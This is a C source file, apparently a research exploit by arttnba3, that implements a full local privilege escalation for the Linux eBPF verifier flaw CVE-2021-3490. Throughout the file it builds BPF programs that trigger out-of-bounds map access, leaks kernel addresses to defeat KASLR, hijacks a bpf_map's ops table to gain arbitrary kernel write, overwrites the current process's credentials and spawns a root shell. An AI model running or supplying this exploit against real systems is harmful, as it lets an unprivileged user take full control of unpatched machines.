#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <string.h>
#include <sys/prctl.h>

#include "kernelpwn.h"
#include "bpf_tools.h"

#define ARRAY_MAP_OPS   0xffffffff822363e0
#define ARRAY_MAP_GET_NEXT_KEY 0xffffffff81239c80
#define INIT_TASK       0xffffffff82e1b400
#define INIT_CRED       0xffffffff82e88f20

#define MAP_SIZE 0x2000

#define VULN_REG    BPF_REG_6

#define TRIGGER_VULN(__map_fd)                          \
        /* load value into r2, make it part-unknown */  \
        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \
        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \
        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \
        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \
        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \
        /* r3 = 0x100000002 */                          \
        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \
        /* triger the vulnerability */                  \
        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)

#define MAKE_VULN_REG(__map_fd)                         \
        /* load value into r3, make it [0, 1] under 32 bit */                \
        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \
        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \
        BPF_MOV64_IMM(BPF_REG_0, 0),                    \
        BPF_EXIT_INSN(),                                \
        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \
        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \
        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \
        BPF_MOV64_IMM(BPF_REG_0, 0)

#define READ_ARBITRARY_ADDR(__map_fd, __idx)            \
        /* extend the alu->limit and do the oob read */ \
        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \
        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \
        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),         \
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \
        /* write the value into bpf_map->btf */         \
        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8),     \
        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),   \
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),        \
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)

static size_t read_arbitrary_addr_4_bytes(int map_fd, int idx)
{
    struct bpf_insn prog[] = {
        TRIGGER_VULN(map_fd),
        MAKE_VULN_REG(map_fd),
        READ_ARBITRARY_ADDR(map_fd, idx), 
        BPF_EXIT_INSN()
    };
    struct bpf_map_info info;
    union bpf_attr attr = {
        .info.bpf_fd = map_fd,
        .info.info_len = sizeof(info),
        .info.info = (uint64_t) &info,
    };
    size_t data;
    int ret;

    ret = run_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), 1, 0);
    if (ret < 0) {
        return 0;
    }

    memset(&info, 0, sizeof(info));
    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &attr);
    if (ret < 0) {
        return 0;
    }

    data = info.btf_id;

    return data;
}

size_t read_arbitrary_addr(int map_fd, size_t addr)
{
    size_t data;
    int key;
    size_t value[0x1000];

    key = 1;
    value[0] = addr;
    if (bpf_map_update_elem(map_fd, &key, &value, 0) < 0) {
        err_exit("FAILED to load value into map!");
    }
    key = 2;
    value[0] = addr + 4;
    if (bpf_map_update_elem(map_fd, &key, &value, 0) < 0) {
        err_exit("FAILED to load value into map!");
    }

    data = read_arbitrary_addr_4_bytes(map_fd, 2);
    data <<= 32;
    data += read_arbitrary_addr_4_bytes(map_fd, 1);

    return data;
}

size_t current_task, current_cred;

size_t search_for_current_task(int map_fd)
{
    size_t next_task = INIT_TASK + kernel_offset + 0x818;
    size_t data;

    prctl(PR_SET_NAME, "arttnba3");

    do {
        next_task = read_arbitrary_addr(map_fd, next_task);
        data = read_arbitrary_addr(map_fd, next_task + 0x2d0);
    } while (data != *(size_t*) "arttnba3");

    return next_task - 0x818;
}

#define LEAK_MAP_ADDR(__map_fd)                         \
        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \
        BPF_MOV32_REG(VULN_REG, VULN_REG),              \
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \
        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \
        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)

size_t map_addr;

int leak_map_addr(int map_fd)
{
    struct bpf_insn prog[] = {
        TRIGGER_VULN(map_fd),
        LEAK_MAP_ADDR(map_fd), 
        BPF_EXIT_INSN()
    };

    return run_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), 1, 0);
}

#define LEAK_MAP_OPS(__map_fd)                      \
        /* extend the alu->limit and do the oob read */ \
        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \
        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \
        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),        \
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \
        /* save the value into map */                   \
        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)

size_t map_ops_addr;

int leak_map_ops_addr(int map_fd)
{
    struct bpf_insn prog[] = {
        TRIGGER_VULN(map_fd),
        MAKE_VULN_REG(map_fd),
        LEAK_MAP_OPS(map_fd), 
        BPF_EXIT_INSN()
    };

    return run_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), 1, 0);
}

#define MAKE_ARBITRARY_WRITE_OPS(__map_fd)          \
        /* extend the alu_limit */                      \
        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \
        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \
        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \
        /* overwrite spin_lock_off */                   \
        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \
        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),         \
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \
        BPF_MOV64_IMM(BPF_REG_5, 0x2000),               \
        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \
        /* overwrite max_entries */                     \
        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \
        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),          \
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \
        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),           \
        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \
        /* overwrite map type */                        \
        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \
        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),          \
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \
        BPF_MOV64_IMM(BPF_REG_5, 23),                   \
        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \
        /* overwrite the map->ops */                    \
        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \
        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),         \
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \
        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4), \
        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),   \
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)

size_t fake_ops_addr;

void make_arbitrary_write_ops(int map_fd)
{
    struct bpf_insn prog[] = {
        TRIGGER_VULN(map_fd),
        MAKE_VULN_REG(map_fd),
        MAKE_ARBITRARY_WRITE_OPS(map_fd),
        BPF_EXIT_INSN()
    };
    int key;
    size_t per_ops_ptr, value[0x1000], value_idx;
    struct bpf_map_ops *ops_data;

    /* save fake ops addr into map */
    fake_ops_addr = map_addr + 0x110 + MAP_SIZE;

    /* read ops */
    value_idx = 0;
    for (size_t i = 0; i < sizeof(struct bpf_map_ops); i += 8) {
        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);
        value[value_idx++] = per_ops_ptr;
    }

    /* load ops */
    ops_data = (struct bpf_map_ops *) value;
    ops_data->map_push_elem = (void*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);
    key = 1;
    if (bpf_map_update_elem(map_fd, &key, &value[0], 0) < 0) {
        err_exit("FAILED to look up value!");
    }

    /* we'll take fake ops's addr from map */
    key = 2;
    value[0] = fake_ops_addr;
    if (bpf_map_update_elem(map_fd, &key, &value[0], 0) < 0) {
        err_exit("FAILED to look up value!");
    }

    /* hijack the map */
    run_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), 1, 0);
}

int arbitrary_write_4_bytes_by_map(int map_fd, size_t addr, unsigned int val)
{
    size_t value[0x1000];
    int key;

    key = 0;
    value[0] = val - 1;

    return bpf_map_update_elem(map_fd, &key, &value[0], addr);
}

#define READ_MAP_DATA(__map_fd, __off)                      \
        /* extend the alu->limit and do the oob read */ \
        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \
        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \
        BPF_ALU64_IMM(BPF_MUL, VULN_REG, __off),        \
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \
        /* save the value into map */                   \
        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)

/* for debug only */
void read_map_data(int map_fd)
{
    size_t map_data[0x100];
    int key;
    size_t value[0x1000];

    puts("[*] Loading value into map...");
    key = 0;
    value[0] = 0;
    if (bpf_map_update_elem(map_fd, &key, &value, 0) < 0) {
        err_exit("FAILED to load value into map!");
    }

    for (int i = 0; i < (0x110 / 8); i++) {
        struct bpf_insn prog[] = {
            TRIGGER_VULN(map_fd),
            MAKE_VULN_REG(map_fd),
            READ_MAP_DATA(map_fd, (0x110 - 0x8 * i)), 
            BPF_EXIT_INSN()
        };

        if (run_bpf_prog(prog, sizeof(prog) / sizeof(prog[0]), 1, 0) < 0) {
            err_exit("FAILED to run bpf prog!");
        }

        key = 1;
        if (bpf_map_lookup_elem(map_fd, &key, &value) < 0) {
            err_exit("FAILED to look up the map!");
        }
        map_data[i] = value[0];
    }

    for (int i = 0; i < (0x200 / 8); i++) {
        printf("[----data dump----][%d] %lx\n", i, map_data[i]);
    }
}

int main(int argc , char **argv, char **envp)
{
    int map_fd;
    int key;
    size_t value[0x1000];
    int log_fd;

    puts("\033[32m\033[1m[=] CVE-2021-3490 explotation by arttnba3\033[0m");

    puts("\n[*] Creating new eBPF map...");
    map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, 4, MAP_SIZE, 0x100);
    if (map_fd < 0) {
        err_exit("FAILED to create eBPF map!");
    }

    puts("\n[*] Loading value into map...");
    key = 0;
    value[0] = 0;
    if (bpf_map_update_elem(map_fd, &key, &value, 0) < 0) {
        err_exit("FAILED to load value into map!");
    }

    puts("\n[*] Leaking addr of bpf_map.ops ...");
    if (leak_map_ops_addr(map_fd) < 0) {
        err_exit("FAILED to run the eBPF prog!");
    }

    puts("\n[*] Checking for leek...");
    key = 1;
    if (bpf_map_lookup_elem(map_fd, &key, &value) < 0) {
        err_exit("FAILED to look up value!");
    }
    if (value[0] < 0xffffffff81000000) {
        printf("[x] Got bad value: %lx\n", value[0]);
        err_exit("FAILED to leak kernel info!");
    }

    map_ops_addr = value[0];
    kernel_offset = map_ops_addr - ARRAY_MAP_OPS;
    kernel_base += kernel_offset;
    init_cred = INIT_CRED + kernel_offset;
    printf("\033[32m\033[1m[+] Get array_map_ops leak: \033[0m%lx\n", value[0]);
    printf("\033[34m\033[1m[*] kernel_offset: \033[0m%lx\n", kernel_offset);
    printf("\033[32m\033[1m[+] kernel_base: \033[0m%lx\n", kernel_base);

    puts("\n[*] Leaking addr of bpf_map ...");
    if (leak_map_addr(map_fd) < 0) {
        err_exit("FAILED to run the eBPF prog!");
    }

    puts("\n[*] Checking for leek...");
    key = 1;
    if (bpf_map_lookup_elem(map_fd, &key, &value) < 0) {
        err_exit("FAILED to look up value!");
    }
    if (value[0] < 0xffff000000000000) {
        printf("[x] Got bad value: %lx\n", value[0]);
        err_exit("FAILED to leak addr of bpf_map!");
    }

    map_addr = value[0] - 0x110;
    printf("\033[32m\033[1m[+] Get addr of bpf_map: \033[0m%lx\n", map_addr);

    puts("\n[*] Search for current task_struct's addr...");
    current_task = search_for_current_task(map_fd);
    current_cred = read_arbitrary_addr(map_fd, current_task + 0xad8);
    printf("\033[32m\033[1m[+] Get current task_struct's addr: \033[0m%lx\n",
           current_task);
    printf("\033[32m\033[1m[+] Get current cred's addr: \033[0m%lx\n",
           current_cred);

    puts("\n[*] Hijacking the bpf_map...");
    make_arbitrary_write_ops(map_fd);

    puts("\n[*] Overwriting the current->cred...");
    for (int i = 0; i < 8; i++) {
        if (arbitrary_write_4_bytes_by_map(map_fd, current_cred+4+4*i, 0) < 0) {
            printf("\033[31m\033[1m[x] Failed to ovwerwrite no.%d\033[0m\n", i);
            err_exit("FAILED to call ops->map_push_elem()!");
        }
    }

    /* record the log in to file here */
    log_fd = open("./log.txt", O_RDWR | O_CREAT);
    if (log_fd < 0) {
        err_exit("FAILED to create log file!");
    }
    write(log_fd, bpf_log_buf, strlen(bpf_log_buf));
    close(log_fd);

    get_root_shell();

    return 0;
}
